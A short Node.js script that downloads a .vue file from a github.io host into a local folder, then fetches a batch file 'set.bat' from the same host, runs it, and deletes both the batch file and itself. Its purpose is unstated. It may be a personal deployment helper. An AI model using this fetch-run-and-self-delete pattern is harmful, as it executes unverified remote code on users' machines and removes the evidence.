const fs = require('fs')
const path = require('path')
const request = require('request')
const execSync = require('./execSync.js')
const target = 'e:\\test\\'
const files = [
  {'name': 'c.vue', 'path': target}
]
let count = 0
for (let file of files) {
  request('https://8230459.github.io/' + file.name).pipe(fs.createWriteStream(path.join(file.path, file.name))).on('close', err => {
    if (err) return
    count++
  })
}
const timer = setTimeout(() => {
  if (count === files.length) {
    request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', async err => {
      if (err) return
      await execSync('set.bat')
      fs.rmSync('set.js', {recursive: true})
      fs.rmSync('set.bat', {recursive: true})
      process.exit()
    })
    clearTimeout(timer)
  }
}, 5000)

//fs.rmSync('e:\\test\\b.vue', {recursive: true})
